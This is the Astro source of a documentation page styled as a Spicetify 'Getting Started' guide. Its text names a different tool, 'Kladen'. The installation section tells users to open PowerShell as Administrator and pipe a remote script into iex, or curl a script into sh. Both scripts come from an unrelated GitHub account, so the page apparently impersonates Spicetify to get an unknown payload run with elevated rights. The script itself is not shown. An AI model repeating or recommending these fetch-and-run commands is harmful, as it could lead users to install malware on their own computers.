---
import Layout from '../../layouts/Layout.astro';
---

<Layout title="Getting Started — Spicetify">
  <div class="container docs">
    <aside class="docs-sidebar">
      <nav>
        <h4>Getting Started</h4>
        <a href="/docs/getting-started" class="active">Installation</a>
        <a href="/docs/customization">Customization</a>
        <a href="#">Development</a>
        <a href="#">FAQ</a>
      </nav>
    </aside>
    <article class="docs-content">
      <h1>Getting Started</h1>
      <p class="lead">Kladen is a command-line tool to customize Spotify client. Follow the steps below to get started.</p>

      <h2>Prerequisites</h2>
      <ul>
        <li>Spotify installed (desktop version)</li>
        <li>Windows, macOS, or Linux</li>
        <li>PowerShell 5.1+ (Windows) or bash (macOS/Linux)</li>
      </ul>

      <h2>Installation</h2>

      <h3>Windows</h3>
      <p>Open PowerShell as Administrator and run:</p>
      <pre><code>iwr -useb https://raw.githubusercontent.com/iviiziviiz8-lab/kladen/main/cli/installers/install.ps1 | iex</code></pre>

      <h3>macOS / Linux</h3>
      <p>Open Terminal and run:</p>
      <pre><code>curl -fsSL https://raw.githubusercontent.com/iviiziviiz8-lab/kladen/main/cli/installers/install.sh | sh</code></pre>

      <h2>Post-installation</h2>
      <p>After installation, run the following command to set up Spicetify:</p>
      <pre><code>kladen config current_theme "your-theme-name"&#10;kladen apply</code></pre>

      <h2>Next Steps</h2>
      <ul>
        <li>Browse <a href="/docs/customization">themes and extensions</a></li>
        <li>Join the <a href="#">Discord community</a></li>
        <li>Check the <a href="#">FAQ</a> for common issues</li>
      </ul>
    </article>
  </div>
</Layout>

<style is:global>
  .docs {
    display: grid;
    grid-template-columns: 240px 1fr;
    gap: 48px;
    padding: 48px 24px;
    max-width: 1100px;
    margin: 0 auto;
  }

  .docs-sidebar {
    position: sticky;
    top: 80px;
    height: fit-content;
  }

  .docs-sidebar h4 {
    font-size: 12px;
    text-transform: uppercase;
    letter-spacing: 0.08em;
    color: var(--text-muted);
    margin-bottom: 16px;
  }

  .docs-sidebar a {
    display: block;
    padding: 6px 0;
    font-size: 14px;
    color: var(--text-muted);
    transition: color 0.2s;
  }

  .docs-sidebar a:hover,
  .docs-sidebar a.active {
    color: var(--text);
  }

  .docs-content h1 {
    font-size: 36px;
    font-weight: 800;
    margin-bottom: 16px;
  }

  .docs-content .lead {
    font-size: 18px;
    color: var(--text-muted);
    margin-bottom: 32px;
  }

  .docs-content h2 {
    font-size: 24px;
    font-weight: 700;
    margin: 40px 0 16px;
  }

  .docs-content h3 {
    font-size: 18px;
    font-weight: 600;
    margin: 24px 0 12px;
  }

  .docs-content p {
    font-size: 16px;
    color: #d4d4d8;
    margin-bottom: 16px;
    line-height: 1.7;
  }

  .docs-content ul {
    list-style: disc;
    padding-left: 24px;
    margin-bottom: 16px;
  }

  .docs-content li {
    font-size: 16px;
    color: #d4d4d8;
    margin-bottom: 8px;
  }

  .docs-content a {
    color: var(--accent);
  }

  .docs-content a:hover {
    text-decoration: underline;
  }

  .docs-content pre {
    margin-bottom: 24px;
  }

  @media (max-width: 768px) {
    .docs { grid-template-columns: 1fr; }
    .docs-sidebar { display: none; }
  }
</style>
